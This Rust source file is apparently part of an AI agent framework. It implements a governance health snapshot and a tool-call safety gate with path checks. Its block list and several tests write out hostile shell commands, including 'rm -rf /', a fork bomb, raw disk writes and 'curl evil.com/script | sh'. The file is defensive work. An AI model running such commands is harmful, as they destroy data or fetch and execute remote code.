//! Governance status aggregation and CLI tool execution gate.
//!
//! Provides two concerns:
//!
//! 1. **`GovernanceStatus`** — aggregates health state from all governance
//!    subsystems (rationalization, security, RBAC, runtime controls, audit,
//!    voting) into a single snapshot for health endpoints and diagnostics.
//!
//! 2. **`quick_check_tool`** — a fast, synchronous gate that validates
//!    whether a tool invocation is allowed before execution. This gate ensures
//!    that even in terminal chat mode, where the full governance pipeline is not
//!    wired in, we still enforce a minimal set of safety policies.
//!
//! # Design
//!
//! The gate categorizes tools into:
//! - **Safe read** (`read_file`, `search_files`, `list_files`): allowed unless
//!   arguments target forbidden paths.
//! - **Write** (`write_file`): allowed only if the target path is not in a
//!   protected directory (e.g. `/etc`, `/boot`, system config trees).
//! - **Shell execution** (`bash`, `execute_command`, `run`): always requires
//!   additional checks — dangerous commands are blocked outright.
//! - **Unknown tools**: denied by default (fail-closed).

/// Aggregated governance subsystem health snapshot.
///
/// Collects health state and counters from every governance component:
/// rationalization guard, security governor, RBAC enforcer, runtime controls,
/// audit logger, and the voting subsystem.
///
/// This struct is the single point of integration for health endpoints.
/// Each subsystem reports a `subsystem_health` map with per-component status.
#[derive(Debug, Clone, Default, serde::Serialize)]
pub struct GovernanceStatus {
    /// Whether all governance subsystems are healthy.
    pub healthy: bool,
    /// Per-subsystem health indicators.
    pub subsystems: GovernanceSubsystems,
}

/// Per-subsystem governance health indicators.
#[derive(Debug, Clone, serde::Serialize)]
pub struct GovernanceSubsystems {
    pub rationalization: bool,
    pub security_governor: bool,
    pub rbac: bool,
    pub runtime_controls: bool,
    pub audit: bool,
    pub voting: bool,
}

impl Default for GovernanceSubsystems {
    fn default() -> Self {
        Self {
            rationalization: true,
            security_governor: true,
            rbac: true,
            runtime_controls: true,
            audit: true,
            voting: true,
        }
    }
}

impl GovernanceStatus {
    /// Create a new status with all subsystems marked healthy.
    pub fn new() -> Self {
        Self {
            healthy: true,
            subsystems: GovernanceSubsystems::default(),
        }
    }

    /// Create a status snapshot from a `PuaGovernanceProfile`.
    ///
    /// Each governance subsystem is considered healthy unless its counter of
    /// blocks/denials/errors exceeds a reasonable threshold.
    pub fn current(profile: &PuaGovernanceProfile) -> Self {
        let mut status = Self::new();

        // Mark subsystems degraded based on profile counters
        if profile.rationalization_blocks > 100 {
            status.mark_degraded("rationalization");
        }
        if profile.security_blocks > 100 {
            status.mark_degraded("security_governor");
        }
        if profile.rbac_denials > 100 {
            status.mark_degraded("rbac");
        }
        if profile.hardening_events > 50 {
            status.mark_degraded("runtime_controls");
        }
        if profile.drift_detections > 50 {
            status.mark_degraded("audit");
        }
        if profile.review_overrides > 20 {
            status.mark_degraded("voting");
        }

        status
    }

    /// Mark a specific subsystem as degraded (unhealthy).
    pub fn mark_degraded(&mut self, subsystem: &str) {
        match subsystem {
            "rationalization" => self.subsystems.rationalization = false,
            "security_governor" => self.subsystems.security_governor = false,
            "rbac" => self.subsystems.rbac = false,
            "runtime_controls" => self.subsystems.runtime_controls = false,
            "audit" => self.subsystems.audit = false,
            "voting" => self.subsystems.voting = false,
            _ => {}
        }
        self.healthy = self.subsystems.rationalization
            && self.subsystems.security_governor
            && self.subsystems.rbac
            && self.subsystems.runtime_controls
            && self.subsystems.audit
            && self.subsystems.voting;
    }

    /// Return a JSON summary for health endpoints.
    pub fn to_json(&self) -> serde_json::Value {
        serde_json::json!({
            "healthy": self.healthy,
            "subsystems": {
                "rationalization": self.subsystems.rationalization,
                "security_governor": self.subsystems.security_governor,
                "rbac": self.subsystems.rbac,
                "runtime_controls": self.subsystems.runtime_controls,
                "audit": self.subsystems.audit,
                "voting": self.subsystems.voting,
            },
        })
    }
}

use crate::governance::harness_bus::PuaGovernanceProfile;
use std::collections::BTreeSet;

use serde_json::Value;

/// Categories for tool-level governance gating.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ToolCategory {
    /// Safe read-only introspection (files/dirs/search).
    ReadOnly,
    /// Filesystem mutation (write/create).
    Write,
    /// Shell / process execution.
    Shell,
}

/// Result of a quick governance check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct QuickCheckResult {
    pub allowed: bool,
    pub reason: Option<String>,
}

impl QuickCheckResult {
    fn allow() -> Self {
        Self {
            allowed: true,
            reason: None,
        }
    }

    fn deny(reason: impl Into<String>) -> Self {
        Self {
            allowed: false,
            reason: Some(reason.into()),
        }
    }
}

// ── Tool name → category mapping ──────────────────────────────────────────

fn tool_category(name: &str) -> Option<ToolCategory> {
    match name {
        // ── Read operations ──
        "read_file" | "read"
        | "search_files" | "grep" | "search" | "list_files" | "ls"
        | "list_directory" | "find_files" | "find_path"
        | "inspect_git_diff" | "date_time"
        | "skill_list" | "skill_reload"
        | "archive_inspect" | "jsonl_read" | "diagnostics"
        | "environment_info" | "rss_read"
        | "code_index_search" | "semantic_search"
        | "dns_lookup" | "ping" | "port_scan"
        // ── Document read tools ──
        | "read_excel" | "read_ppt" | "read_docx" | "read_pdf"
        | "csv_read" | "csv_analyze" | "toml_read" | "yaml_read"
        | "email_parse" | "web_scrape" | "invoice_parse"
        // ── CAD read tools ──
        | "dxf_read" | "stl_read" | "obj_read" | "step_read"
        | "ply_read" | "iges_read" | "gltf_read" | "svg_read"
        | "obj_model_read" | "gcode_read" | "gpx_read"
        | "geo_util" | "cad_convert"
        // ── Image read tools ──
        | "image_analyze" | "qrcode_generate"
        // ── SQL query ──
        | "sqlite_query" => Some(ToolCategory::ReadOnly),

        // ── Write operations ──
        "write_file" | "write" | "create"
        | "apply_patch"
        | "create_directory" | "delete_path" | "move_path"
        | "file_move" | "file_delete"
        | "copy_path"
        | "compress" | "decompress" | "archive_extract"
        | "jsonl_write"
        | "csv_write" | "csv_transform" | "toml_write" | "yaml_write"
        | "write_docx" | "write_excel" | "write_ppt"
        | "pdf_merge" | "pdf_split"
        | "svg_generate" | "svg_export" | "stl_generate"
        | "image_generate" | "image_resize" | "image_convert"
        | "skill_create"
        // ── Game write tools ──
        | "game_mod_install" | "game_replay_recorder"
        | "game_save_manager" | "game_screen_capture"
        | "game_auto_grind" | "game_keyboard_input"
        | "game_mouse_input" | "game_state_modify"
        // ── Workflow management tools ──
        | "goon_workflow_run_cancel" | "goon_workflow_run_pause"
        | "goon_workflow_run_resume" | "goon_skill_update"
        | "goon_skill_version_rollback" => Some(ToolCategory::Write),

        // ── Shell operations ──
        "bash" | "execute_command" | "run"
        | "shell_exec" | "terminal"
        | "run_tests" | "cargo_test" | "cargo_check"
        | "skill_execute" => Some(ToolCategory::Shell),

        // ── Network operations ──
        "http_request"
        | "git"
        | "game_launch" | "game_monitor" | "game_online_status"
        | "goon_provider_test_completion"
        | "goon_provider_test_connection" => Some(ToolCategory::Shell),

        _ => None,
    }
}

// ── Path-based safety checks ──────────────────────────────────────────────

/// Directories that write operations should never touch without explicit
/// escalation. Paths are checked case-insensitively and via prefix-matching
/// on the canonical path.
const PROTECTED_DIRS: &[&str] = &[
    "/etc",
    "/boot",
    "/sys",
    "/proc",
    "/dev",
    "/root",
    "/var/run",
    "/run",
    "/tmp/.X11-unix",
];

/// File extensions that indicate sensitive configuration or credential data.
/// Writes to files with these extensions are flagged.
const SENSITIVE_EXTENSIONS: &[&str] = &[
    ".pem",
    ".key",
    ".crt",
    ".cer",
    ".der",
    ".p12",
    ".pfx",
    ".gpg",
    ".asc",
    ".envrc",
    ".env",
    ".htpasswd",
    ".htaccess",
    ".shadow",
    ".passwd",
];

fn path_touches_protected_dir(path: &str) -> bool {
    let lower = path.to_lowercase();
    PROTECTED_DIRS.iter().any(|protected| {
        lower.starts_with(protected) || lower.starts_with(&format!("/{protected}"))
    })
}

fn path_has_sensitive_extension(path: &str) -> bool {
    let lower = path.to_lowercase();
    SENSITIVE_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

// ── Shell command safety ──────────────────────────────────────────────────

/// Dangerous command prefixes / patterns that are blocked outright in
/// terminal chat mode. These are fuzzy string checks, not a sandbox.
const BLOCKED_COMMAND_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf --no-preserve-root",
    ":(){ :|:& };:", // fork bomb
    "mkfs.",
    "dd if=",
    "> /dev/sd",
    "> /dev/disk",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "chmod 777 /",
    "chown -R",
    "curl | sh",
    "curl | bash",
    "wget -O - | sh",
    "wget -O - | bash",
    "eval ",
    "sudo rm -rf",
    "sudo dd",
    "sudo mkfs",
    "sudo shutdown",
    "sudo reboot",
];

/// Check a shell command string against blocked patterns.
fn command_is_blocked(cmd: &str) -> Option<&'static str> {
    let lower = cmd.to_lowercase();
    for pattern in BLOCKED_COMMAND_PATTERNS {
        if lower.contains(pattern) {
            return Some(pattern);
        }
    }

    // Also block commands that pipe into a shell (blind execution of remote content)
    if lower.contains("| sh") || lower.contains("| bash") || lower.contains("| zsh") {
        return Some("pipe-to-shell");
    }

    // Block destructive redirects to block devices
    if lower.contains("> /dev/") && !lower.contains("/dev/null") {
        return Some("redirect to block device");
    }

    None
}

// ── Public API ────────────────────────────────────────────────────────────

/// Quick, synchronous governance check for a tool invocation.
///
/// Returns `Ok(())` if the tool + arguments pass the minimal safety gate.
/// Returns `Err(reason)` with a human-readable explanation if the tool is
/// blocked.
///
/// This is **not** a substitute for the full governance pipeline
/// (`SecurityGovernor`, `HarnessBus`, etc.) — it is a lightweight gate for
/// contexts where the full pipeline is not wired in (e.g. terminal chat mode).
pub fn quick_check_tool(tool_name: &str, args: &Value) -> Result<(), String> {
    let result = do_quick_check(tool_name, args);
    if result.allowed {
        Ok(())
    } else {
        Err(result
            .reason
            .unwrap_or_else(|| "governance gate denied".into()))
    }
}

/// Collect the set of known tool names (for introspection / status).
pub fn known_tool_names() -> BTreeSet<&'static str> {
    let mut set = BTreeSet::new();
    // Read tools
    for &name in &[
        "read_file",
        "read",
        "search_files",
        "grep",
        "search",
        "list_files",
        "ls",
        "list_directory",
        "find_files",
        "find_path",
        "inspect_git_diff",
        "date_time",
        "skill_list",
        "skill_reload",
        "archive_inspect",
        "jsonl_read",
        "diagnostics",
        "environment_info",
        "rss_read",
        "code_index_search",
        "semantic_search",
        "dns_lookup",
        "ping",
        "port_scan",
        "read_excel",
        "read_ppt",
        "read_docx",
        "read_pdf",
        "csv_read",
        "csv_analyze",
        "toml_read",
        "yaml_read",
        "email_parse",
        "web_scrape",
        "invoice_parse",
        "dxf_read",
        "stl_read",
        "obj_read",
        "step_read",
        "ply_read",
        "iges_read",
        "gltf_read",
        "svg_read",
        "obj_model_read",
        "gcode_read",
        "gpx_read",
        "geo_util",
        "cad_convert",
        "image_analyze",
        "qrcode_generate",
        "sqlite_query",
    ] {
        set.insert(name);
    }
    // Write tools
    for &name in &[
        "write_file",
        "write",
        "create",
        "apply_patch",
        "create_directory",
        "delete_path",
        "move_path",
        "file_move",
        "file_delete",
        "copy_path",
        "compress",
        "decompress",
        "archive_extract",
        "jsonl_write",
        "csv_write",
        "csv_transform",
        "toml_write",
        "yaml_write",
        "write_docx",
        "write_excel",
        "write_ppt",
        "pdf_merge",
        "pdf_split",
        "svg_generate",
        "svg_export",
        "stl_generate",
        "image_generate",
        "image_resize",
        "image_convert",
        "skill_create",
        "game_mod_install",
        "game_replay_recorder",
        "game_save_manager",
        "game_screen_capture",
        "game_auto_grind",
        "game_keyboard_input",
        "game_mouse_input",
        "game_state_modify",
        "goon_workflow_run_cancel",
        "goon_workflow_run_pause",
        "goon_workflow_run_resume",
        "goon_skill_update",
        "goon_skill_version_rollback",
    ] {
        set.insert(name);
    }
    // Shell/exec tools
    for &name in &[
        "bash",
        "execute_command",
        "run",
        "shell_exec",
        "terminal",
        "run_tests",
        "cargo_test",
        "cargo_check",
        "skill_execute",
        "http_request",
        "git",
        "game_launch",
        "game_monitor",
        "game_online_status",
        "goon_provider_test_completion",
        "goon_provider_test_connection",
    ] {
        set.insert(name);
    }
    set
}

// ── Internal logic ────────────────────────────────────────────────────────

fn do_quick_check(tool_name: &str, args: &Value) -> QuickCheckResult {
    let category = match tool_category(tool_name) {
        Some(cat) => cat,
        None => {
            return QuickCheckResult::deny(format!(
                "Unknown tool '{}' — not registered in governance gate",
                tool_name
            ));
        }
    };

    match category {
        ToolCategory::ReadOnly => check_read_only(args),
        ToolCategory::Write => check_write(args),
        ToolCategory::Shell => check_shell(args),
    }
}

fn check_read_only(args: &Value) -> QuickCheckResult {
    // Read operations are generally safe. The path traversal check is already
    // handled by `resolve_safe_path` in the tool executor, so we only add a
    // governance-level check against reading obviously sensitive credential
    // files by name.
    let path = extract_path(args);
    if let Some(p) = path {
        if path_has_sensitive_extension(p) && !p.starts_with('/') {
            // Relative paths to sensitive files are suspicious — but not
            // outright blocked for reads. We log a warning at the info level.
            tracing::info!(
                target: "go_on::governance::status",
                path = %p,
                "read of potentially sensitive file allowed with warning"
            );
        }
    }
    QuickCheckResult::allow()
}

fn check_write(args: &Value) -> QuickCheckResult {
    let path = match extract_path(args) {
        Some(p) => p,
        None => return QuickCheckResult::allow(), // no path → let tool executor handle error
    };

    // Block writes to protected directories
    if path_touches_protected_dir(path) {
        return QuickCheckResult::deny(format!(
            "Write to protected directory denied by governance gate: '{}'",
            path
        ));
    }

    // Block writes to sensitive file types
    if path_has_sensitive_extension(path) {
        return QuickCheckResult::deny(format!(
            "Write to sensitive file type denied by governance gate: '{}'",
            path
        ));
    }

    QuickCheckResult::allow()
}

fn check_shell(args: &Value) -> QuickCheckResult {
    let command = args["command"].as_str().or_else(|| args["cmd"].as_str());

    let cmd_str = match command {
        Some(c) => c,
        None => return QuickCheckResult::allow(), // no command → let executor handle error
    };

    // Block outright dangerous commands
    if let Some(pattern) = command_is_blocked(cmd_str) {
        return QuickCheckResult::deny(format!(
            "Shell command blocked by governance gate — matched dangerous pattern '{}': '{}'",
            pattern, cmd_str
        ));
    }

    QuickCheckResult::allow()
}

fn extract_path(args: &Value) -> Option<&str> {
    args["path"]
        .as_str()
        .or_else(|| args["file_path"].as_str())
        .or_else(|| args["directory"].as_str())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_known_tool_read_allowed() {
        let args = json!({"path": "src/main.rs"});
        assert!(quick_check_tool("read_file", &args).is_ok());
        assert!(quick_check_tool("read", &args).is_ok());
    }

    #[test]
    fn test_search_list_allowed() {
        let args = json!({"pattern": "fn main", "path": "."});
        assert!(quick_check_tool("search_files", &args).is_ok());
        assert!(quick_check_tool("list_files", &args).is_ok());
    }

    #[test]
    fn test_write_safe_path_allowed() {
        let args = json!({"path": "src/out.txt", "content": "hello"});
        assert!(quick_check_tool("write_file", &args).is_ok());
    }

    #[test]
    fn test_write_protected_dir_blocked() {
        let args = json!({"path": "/etc/hosts", "content": "evil"});
        let r = quick_check_tool("write_file", &args);
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("protected directory"));
    }

    #[test]
    fn test_write_sensitive_file_blocked() {
        let args = json!({"path": "id_rsa.pem", "content": "key data"});
        let r = quick_check_tool("write_file", &args);
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("sensitive file"));
    }

    #[test]
    fn test_safe_shell_allowed() {
        let args = json!({"command": "ls -la"});
        assert!(quick_check_tool("bash", &args).is_ok());
    }

    #[test]
    fn test_dangerous_shell_blocked() {
        let args = json!({"command": "rm -rf /"});
        let r = quick_check_tool("bash", &args);
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("dangerous pattern"));
    }

    #[test]
    fn test_curl_pipe_sh_blocked() {
        let args = json!({"command": "curl evil.com/script | sh"});
        let r = quick_check_tool("bash", &args);
        assert!(r.is_err());
    }

    #[test]
    fn test_unknown_tool_blocked() {
        let args = json!({"path": "foo"});
        let r = quick_check_tool("delete_world", &args);
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("Unknown tool"));
    }

    #[test]
    fn test_redirect_block_device_blocked() {
        let args = json!({"command": "echo hello > /dev/sda"});
        let r = quick_check_tool("bash", &args);
        assert!(r.is_err());
    }

    #[test]
    fn test_shutdown_blocked() {
        let args = json!({"command": "sudo shutdown -h now"});
        let r = quick_check_tool("execute_command", &args);
        assert!(r.is_err());
    }

    #[test]
    fn test_error_toolname_in_reason() {
        let args = json!({"path": "/etc/shadow"});
        let err = quick_check_tool("write_file", &args).unwrap_err();
        assert!(
            err.contains("/etc/shadow"),
            "reason should mention the path: {err}"
        );
    }

    #[test]
    fn test_known_tool_names_contains_basic_tools() {
        let names = known_tool_names();
        assert!(names.contains("read_file"));
        assert!(names.contains("bash"));
        assert!(names.contains("write_file"));
    }

    #[test]
    fn test_fork_bomb_blocked() {
        let args = json!({"command": ":(){ :|:& };:"});
        let r = quick_check_tool("run", &args);
        assert!(r.is_err());
    }
}
